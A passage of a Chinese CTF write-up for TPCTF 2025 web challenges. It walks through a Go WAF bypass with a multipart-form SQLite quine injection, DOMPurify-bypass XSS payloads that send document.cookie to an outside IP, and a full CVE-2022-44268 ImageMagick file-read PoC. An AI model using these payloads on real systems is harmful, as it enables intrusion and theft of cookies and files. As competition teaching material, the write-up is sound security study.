class="line">log.Printf(<span class="string">&quot;解析 POST 参数失败: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.ParseForm(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;解析 POST 参数失败: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, values := <span class="keyword">range</span> r.PostForm &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;POST 参数 %s=%v&quot;</span>, key, values)</span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> values &#123;</span><br><span class="line"><span class="keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;阻止 SQL 注入: POST 参数 %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> rcePattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;阻止 RCE 攻击: POST 参数 %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> hotfixPattern.MatchString(value) &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;POST 参数 %s=%s&quot;</span>, key, value)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isBlockedUserAgent</span><span class="params">(userAgent <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, blocked := <span class="keyword">range</span> blockedUserAgents &#123;</span><br><span class="line"><span class="keyword">if</span> strings.Contains(strings.ToLower(userAgent), blocked) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reverseProxyHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">clientIP := r.RemoteAddr</span><br><span class="line"><span class="keyword">if</span> isBlockedIP(clientIP) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Forbidden&quot;</span>, http.StatusForbidden)</span><br><span class="line">log.Printf(<span class="string">&quot;阻止的 IP: %s&quot;</span>, clientIP)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bodyBytes, err := io.ReadAll(r.Body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Bad Request&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isMaliciousRequest(r) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Malicious request detected&quot;</span>, http.StatusForbidden)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isBlockedUserAgent(r.UserAgent()) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Forbidden User-Agent&quot;</span>, http.StatusForbidden)</span><br><span class="line">log.Printf(<span class="string">&quot;阻止的 User-Agent: %s&quot;</span>, r.UserAgent())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxyReq, err := http.NewRequest(r.Method, backendURL+r.RequestURI, bytes.NewBuffer(bodyBytes))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">proxyReq.Header = r.Header</span><br><span class="line"></span><br><span class="line">client := &amp;http.Client&#123;</span><br><span class="line">CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := client.Do(proxyReq)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, values := <span class="keyword">range</span> resp.Header &#123;</span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> values &#123;</span><br><span class="line"><span class="keyword">if</span> key == <span class="string">&quot;Location&quot;</span> &#123;</span><br><span class="line">value = strings.Replace(value, backendHost, r.Host, <span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line">w.Header().Add(key, value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">w.WriteHeader(resp.StatusCode)</span><br><span class="line">io.Copy(w, resp.Body)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/&quot;</span>, reverseProxyHandler)</span><br><span class="line">log.Println(<span class="string">&quot;Listen on 0.0.0.0:8080&quot;</span>)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个<code>waf</code>是实现了一个简单的反向代理服务器，主要功能是将客户端请求转发到后端服务器，同时具备一定的安全防护机制，能够检测<code>SQL</code>注入、远程代码执行<code>RCE</code>攻击，以及屏蔽特定的 <code>IP</code> 和用户代理。</p><p>但是我们通过POST，感觉是没有办法绕过waf的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> r.Method == http.MethodPost &#123;</span><br><span class="line">ct := r.Header.Get(<span class="string">&quot;Content-Type&quot;</span>)</span><br><span class="line">mediaType, _, err := mime.ParseMediaType(ct)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;解析 Content-Type 失败: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> mediaType == <span class="string">&quot;multipart/form-data&quot;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.ParseMultipartForm(<span class="number">65535</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;解析 POST 参数失败: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.ParseForm(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;解析 POST 参数失败: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有点奇怪的，明明没有任何文件上传的点，可是这里有个关于文件上传的multipart&#x2F;form-data</p><p>这里提供一些文章：</p><p><a href="https://www.geekby.site/2022/03/waf-bypass/#bypass-%E6%80%9D%E8%B7%AF---%E5%88%9D%E7%BA%A7">https://www.geekby.site/2022/03/waf-bypass/#bypass-%E6%80%9D%E8%B7%AF---%E5%88%9D%E7%BA%A7</a></p><p><a href="https://blog.csdn.net/Thewei666/article/details/142408096">https://blog.csdn.net/Thewei666/article/details/142408096</a></p><p>这里后来去学了一下，详情<code>WAF Bypass</code>笔记。</p><p>这里的go文件其实就相当于一个waf，python作为后端，那么我们可以通过一些手法来绕过waf，实现sql注入，同时这里sql注入的方法是quine注入！</p><p>注意一下：这里python作为后端，可能识别的是第二行的，waf识别第一行从而绕过！</p><img src="/2025/03/30/TPCTF2025-wp/image-20250326192812797.png" class="" title="This is an example image"><p>感觉要拿下了，直接绕过了waf。接下来就是quine注入，在password中构造。</p><img src="/2025/03/30/TPCTF2025-wp/image-20250326195757686.png" class="" title="This is an example image"><p>这里卡了好久！！sqlite没有<code>#</code>注释符！！！！要换用<code>-- </code>，同时要注意union select后的1,2，这也是不能少的！我的理解是3是对应的回显位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /flag/ HTTP/1.1</span><br><span class="line">Host: 156.238.233.113:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: multipart/form-data; boundary=aaa;</span><br><span class="line">Content-Length: 198</span><br><span class="line"></span><br><span class="line">--aaa</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">--aaa</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;;filename=&quot;1&quot;;</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">1&#x27;/**/union/**/select/**/1,2,replace(replace(&#x27;1&quot;/**/union/**/select/**/1,2,replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)-- &#x27;,char(34),char(39)),char(46),&#x27;1&quot;/**/union/**/select/**/1,2,replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)-- &#x27;)-- </span><br><span class="line">--aaa--</span><br></pre></td></tr></table></figure><h2 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe layout"></a>safe layout</h2><p>这道题的web界面和bot界面和baby layout是一模一样的。</p><p>那么接下来我们找一下区别。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const sanitizedContent = DOMPurify.sanitize(content, &#123; ALLOWED_ATTR: [] &#125;);</span><br><span class="line">const sanitizedLayout = DOMPurify.sanitize(layout, &#123; ALLOWED_ATTR: [] &#125;);</span><br><span class="line"></span><br><span class="line">const sanitizedContent = DOMPurify.sanitize(content);</span><br><span class="line">const sanitizedLayout = DOMPurify.sanitize(layout);</span><br></pre></td></tr></table></figure><p>问一下ai他们的区别。</p><blockquote><p><code>&#123; ALLOWED_ATTR: [] &#125;</code>：</p><ul><li><code>ALLOWED_ATTR</code> 是 DOMPurify 的选项，用于指定 <strong>允许的 HTML 属性</strong>。</li><li><code>[]</code> 为空数组，表示<strong>不允许任何 HTML 属性</strong>（如 <code>href</code>、<code>src</code>、<code>onclick</code> 等）。</li><li>但<strong>HTML 标签仍然可以保留</strong>，比如 <code>&lt;b&gt;text&lt;/b&gt;</code> 仍然有效，但 <code>&lt;a href=&quot;example.com&quot;&gt;link&lt;/a&gt;</code> 会变成 <code>&lt;a&gt;link&lt;/a&gt;</code>（因为 <code>href</code> 被移除）。</li></ul></blockquote><p>先本地看看效果：</p><img src="/2025/03/30/TPCTF2025-wp/image-20250326210831685.png" class="" title="This is an example image"><p>除了html标签都没了！</p><p><a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations">https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations</a></p><img src="/2025/03/30/TPCTF2025-wp/image-20250326233334620.png" class="" title="This is an example image"><p>我们可以用这种方法来绕过！</p><img src="/2025/03/30/TPCTF2025-wp/image-20250326233448334.png" class="" title="This is an example image"><p>拼接一下吧~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img aria-meteor=&quot;&#123;&#123;content&#125;&#125;&quot;&gt;</span><br><span class="line"></span><br><span class="line">x&quot; src=&quot;x&quot; onerror=&quot;window.open(&#x27;http://156.238.233.113:4567/?cookie=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250327003038456.png" class="" title="This is an example image"><p>感觉是可以了！</p><img src="/2025/03/30/TPCTF2025-wp/image-20250327003114722.png" class="" title="This is an example image"><h2 id="safe-layout-revenge"><a href="#safe-layout-revenge" class="headerlink" title="safe layout revenge"></a>safe layout revenge</h2><p>附件密码：TPCTF{D0_n07_M0D1FY_7h3_0U7PU7_Af73R_H7mL_5aN171z1n9}</p><p>变化如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sanitizedContent = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(content, &#123;</span><br><span class="line">    <span class="attr">ALLOWED_ATTR</span>: [],</span><br><span class="line">    <span class="attr">ALLOW_ARIA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">ALLOW_DATA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> sanitizedLayout = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(layout, &#123;</span><br><span class="line">    <span class="attr">ALLOWED_ATTR</span>: [],</span><br><span class="line">    <span class="attr">ALLOW_ARIA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">ALLOW_DATA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>这下子把data和aria都ban了。</p><img src="/2025/03/30/TPCTF2025-wp/image-20250328165443147.png" class="" title="This is an example image"><p>本地测一下：</p><img src="/2025/03/30/TPCTF2025-wp/image-20250328165619960.png" class="" title="This is an example image"><p>整体思路是采用 style 绕过，测试发现当 style 标签前面跟上一些字符时，style 内部的元素可能会得以保留，故这里采用的是删除策略，把 xss 的 payload 构造好后，把 script 标签插入 content，在第二次 post 的时候删除就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;img src=x onerror=&quot;window.open(&#x27;http://156.238.233.113:4567/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;</span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250328170944060.png" class="" title="This is an example image"><img src="/2025/03/30/TPCTF2025-wp/image-20250328171011261.png" class="" title="This is an example image"><h2 id="thumbor-1"><a href="#thumbor-1" class="headerlink" title="thumbor 1"></a>thumbor 1</h2><p>只给了一个Dockerfile。打开看看。附件给的是thumbor的插件环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM python:3.7.11-buster</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y libexiv2-dev libboost-python-dev exiftool</span><br><span class="line">RUN git clone --depth 1 https://gerrit.wikimedia.org/r/operations/software/thumbor-plugins</span><br><span class="line">RUN pip install -r thumbor-plugins/requirements.txt</span><br><span class="line">RUN dd if=thumbor-plugins/README.md of=thumbor.conf bs=1 count=1947 skip=610</span><br><span class="line">RUN echo TPCTF&#123;...&#125; &gt; /flag</span><br><span class="line">ENV PYTHONPATH=/thumbor-plugins</span><br><span class="line">ENTRYPOINT thumbor --port 8800 --conf=thumbor.conf -a wikimedia_thumbor.app.App</span><br></pre></td></tr></table></figure><p>我们可以看到他下载了thumbor-plugins，我们下载一下源码看看。</p><p>注意，这里的源码要在docker中下载才行哦~</p><img src="/2025/03/30/TPCTF2025-wp/image-20250329151611253.png" class="" title="This is an example image"><p>这里主要需要关注engine文件夹和handler文件夹。一个引擎一个路由。</p><p>发现handler文件夹下有三个文件夹，对应三个路由。</p><img src="/2025/03/30/TPCTF2025-wp/image-20250329151740837.png" class="" title="This is an example image"><p>再看看engine文件夹，在其中发现了imagemagick。</p><img src="/2025/03/30/TPCTF2025-wp/image-20250329151836721.png" class="" title="This is an example image"><blockquote><p><strong>About</strong></p><p>ImageMagick is a powerful, open-source software suite for creating, editing, converting, and manipulating images in over 200 formats. Ideal for web developers, graphic designers, and researchers, it offers versatile tools for image processing, including batch processing, format conversion, and complex image transformations.</p></blockquote><p>那么就是说明thumbor-plugins中用到了imagemagick，如果imagemagick存在漏洞那么就可以打啦~</p><p>网上可以搜到cve2016的和cve2022的，直接尝试用2022的任意文件读取。</p><p><a href="https://forum.butian.net/article/444">https://forum.butian.net/article/444</a></p><img src="/2025/03/30/TPCTF2025-wp/image-20250329154503313.png" class="" title="This is an example image"><p>环境是好的，那么接下来就是漏洞利用了。</p><p>但是这个漏洞需要我们上传恶意图片到服务端啊，可是这thumbor1没有任何上传的地方。</p><p><a href="https://thumbor.readthedocs.io/en/latest/security.html">https://thumbor.readthedocs.io/en/latest/security.html</a></p><img src="/2025/03/30/TPCTF2025-wp/image-20250329155915387.png" class="" title="This is an example image"><p>那么我们就可以把恶意图片放到自己的vps，让靶机去访问我们！</p><p>poc.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> png</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stderr, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">d = zlib.decompressobj()</span><br><span class="line">e = zlib.compressobj()</span><br><span class="line">IHDR = <span class="string">b&#x27;\x00\x00\x00\n\x00\x00\x00\n\x08\x02\x00\x00\x00&#x27;</span></span><br><span class="line">IDAT = <span class="string">b&#x27;x\x9c\xbd\xcc\xa1\x11\xc0 \x0cF\xe1\xb4\x03D\x91\x8b`\xffm\x98\x010\x89\x01\xc5\x00\xfc\xb8\n\x8eV\xf6\xd9&#x27;</span> \</span><br><span class="line">       <span class="string">b&#x27;\xef\xee])%z\xef\xfe\xb0\x9f\xb8\xf7^J!\xa2Zkkm\xe7\x10\x02\x80\x9c\xf3\x9cSD\x0esU\x1dc\xa8\xeaa\x0e\xc0&#x27;</span> \</span><br><span class="line">       <span class="string">b&#x27;\xccb\x8cf\x06`gwgf\x11afw\x7fx\x01^K+F&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_data</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    _, data = data.strip().split(<span class="string">b&#x27;\n&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(data.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">filename: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">        logging.error(<span class="string">&#x27;you must specify a input filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p = png.Reader(filename=filename)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> p.chunks():</span><br><span class="line">        logging.info(<span class="string">&quot;chunk %s found, value = %r&quot;</span>, k.decode(), v)</span><br><span class="line">        <span class="keyword">if</span> k == <span class="string">b&#x27;zTXt&#x27;</span>:</span><br><span class="line">            name, data = v.split(<span class="string">b&#x27;\x00&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">            res = parse_data(d.decompress(data[<span class="number">1</span>:]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        sys.stdout.write(res)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">from_filename, to_filename, read_filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> to_filename:</span><br><span class="line">        logging.error(<span class="string">&#x27;you must specify a output filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(to_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(png.signature)</span><br><span class="line">        <span class="keyword">if</span> from_filename:</span><br><span class="line">            p = png.Reader(filename=from_filename)</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> p.chunks():</span><br><span class="line">                <span class="keyword">if</span> k != <span class="string">b&#x27;IEND&#x27;</span>:</span><br><span class="line">                    png.write_chunk(f, k, v)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            png.write_chunk(f, <span class="string">b&#x27;IHDR&#x27;</span>, IHDR)</span><br><span class="line">            png.write_chunk(f, <span class="string">b&#x27;IDAT&#x27;</span>, IDAT)</span><br><span class="line"></span><br><span class="line">        png.write_chunk(f, <span class="string">b&quot;tEXt&quot;</span>, <span class="string">b&quot;profile\x00&quot;</span> + read_filename.encode())</span><br><span class="line">        png.write_chunk(f, <span class="string">b&#x27;IEND&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;POC for CVE-2022-44268&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;action&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, choices=(<span class="string">&#x27;generate&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>))</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--input&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;input filename&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;output filename&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-r&#x27;</span>, <span class="string">&#x27;--read&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;target file to read&#x27;</span>, default=<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.action == <span class="string">&#x27;generate&#x27;</span>:</span><br><span class="line">        write(args.<span class="built_in">input</span>, args.output, args.read)</span><br><span class="line">    <span class="keyword">elif</span> args.action == <span class="string">&#x27;parse&#x27;</span>:</span><br><span class="line">        read(args.<span class="built_in">input</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.error(<span class="string">&quot;bad action&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 123.py generate -o poc.png -r /etc/passwd</span><br></pre></td></tr></table></figure><p>然后我们把生成的poc.png放到vps的网站目录下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">156.238.233.113:8800/thumbor/unsafe/450x/156.238.233.113/poc.png</span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250329161032473.png" class="" title="This is an example image"><p>给这个图片下载下来。然后我们提取图片中的内容！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 123.py parse -i poc11.png</span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250329161140805.png" class="" title="This is an example image"><p>拿下了。。。那么接下来直接搞flag的。</p><img src="/2025/03/30/TPCTF2025-wp/image-20250329162020388.png" class="" title="This is an example image"><p>十六进制解码一下获取flag！！</p><h2 id="thumbor-2"><a href="#thumbor-2" class="headerlink" title="thumbor 2"></a>thumbor 2</h2><p>先看看DockerFile，发现跟thumbor1的没啥大区别？这里的dockerfile中多了一个imagemagick。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 